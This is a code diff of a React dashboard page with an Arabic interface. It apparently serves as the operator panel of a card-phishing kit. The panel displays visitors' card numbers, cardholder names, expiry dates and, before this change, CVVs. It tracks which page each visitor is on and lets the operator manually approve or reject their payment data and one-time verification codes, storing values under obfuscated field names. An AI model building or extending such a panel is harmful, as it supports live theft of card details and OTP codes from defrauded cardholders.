@@ -253,15 +253,41 @@ export default function DashboardPage() {
     setActionLoading(null);
   };
 
-  // Get current page from visitor data
+  // Get current page and status from visitor data
   const getCurrentPage = (): string => {
     const raw = selectedRequest?.raw;
     return raw?.currentPage || raw?.page || "";
   };
 
+  const getPaymentStatus = (): string => {
+    const raw = selectedRequest?.raw;
+    return raw?._v1Status || "";
+  };
+
+  const getOtpStatus = (): string => {
+    const raw = selectedRequest?.raw;
+    return raw?._v5Status || "";
+  };
+
   // Render action buttons based on current page
   const renderActionButtons = () => {
     const currentPage = getCurrentPage();
+    const paymentStatus = getPaymentStatus();
+    const otpStatus = getOtpStatus();
+
+    // Show payment status if already decided
+    if (currentPage === "check" && paymentStatus) {
+      return (
+        <div style={{ background: paymentStatus === "approved" ? "#dcfce7" : "#fee2e2", borderRadius: 12, padding: 16, border: `1px solid ${paymentStatus === "approved" ? "#86efac" : "#fca5a5"}`, marginBottom: 16 }}>
+          <h3 style={{ margin: "0 0 8px", fontSize: "0.9rem", fontWeight: 700, color: paymentStatus === "approved" ? "#166534" : "#991b1b" }}>
+            {paymentStatus === "approved" ? "✅ تم الموافقة على الدفع" : "❌ تم رفض الدفع"}
+          </h3>
+          <p style={{ margin: 0, fontSize: "0.85rem", color: paymentStatus === "approved" ? "#15803d" : "#dc2626" }}>
+            {paymentStatus === "approved" ? "العميل يتم توجيهه للخطوة التالية" : "العميل يجب أن يعيد إدخال بيانات الدفع"}
+          </p>
+        </div>
+      );
+    }
 
     if (currentPage === "check") {
       return (
@@ -291,6 +317,17 @@ export default function DashboardPage() {
               {actionLoading === "payment" ? "جاري..." : "❌ مرفوض"}
             </button>
           </div>
+        </div>
+      );
+    }
+
+    // Show OTP status if already decided
+    if ((currentPage === "veri" || currentPage === "step2") && otpStatus) {
+      return (
+        <div style={{ background: otpStatus === "approved" ? "#dcfce7" : "#fee2e2", borderRadius: 12, padding: 16, border: `1px solid ${otpStatus === "approved" ? "#86efac" : "#fca5a5"}`, marginBottom: 16 }}>
+          <h3 style={{ margin: "0 0 8px", fontSize: "0.9rem", fontWeight: 700, color: otpStatus === "approved" ? "#166534" : "#991b1b" }}>
+            {otpStatus === "approved" ? "✅ تم الموافقة على رمز التحقق" : "❌ تم رفض رمز التحقق"}
+          </h3>
         </div>
       );
     }
@@ -789,13 +826,16 @@ export default function DashboardPage() {
 
                 {/* Card Info */}
                 <div style={{ background: "#ffffff", borderRadius: 12, padding: 16, border: "1px solid #e5e7eb" }}>
-                  <h3 style={{ margin: "0 0 12px", fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>معلومات البطاقة</h3>
+                  <h3 style={{ margin: "0 0 12px", fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>معلومات الدفع</h3>
                   <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
                     {[
-                      { label: "رقم البطاقة", value: selectedRequest.raw?.cardNumber },
-                      { label: "اسم مالك البطاقة", value: selectedRequest.raw?.cardOwner },
-                      { label: "تاريخ الانتهاء", value: selectedRequest.raw?.cardExpiry },
-                      { label: "رمز الأمان", value: selectedRequest.raw?.cvv },
+                      { label: "طريقة الدفع", value: selectedRequest.raw?.paymentMethod === 'credit-card' ? 'بطاقة ائتمانية' : 'بطاقة مدى' },
+                      { label: "نوع البطاقة", value: selectedRequest.raw?.cardType },
+                      { label: "البنك", value: selectedRequest.raw?.bankInfo?.name },
+                      { label: "بلد البنك", value: selectedRequest.raw?.bankInfo?.country },
+                      { label: "رقم البطاقة", value: selectedRequest.raw?._v1 ? '•••• ' + String(selectedRequest.raw._v1).slice(-4) : selectedRequest.raw?.cardNumber },
+                      { label: "تاريخ الانتهاء", value: selectedRequest.raw?._v4 },
+                      { label: "الحالة", value: getPaymentStatus() === 'approved' ? '✅ مقبولة' : getPaymentStatus() === 'rejected' ? '❌ مرفوضة' : '⏳ بانتظار المراجعة' },
                     ].map(
                       (item) =>
                         item.value && (
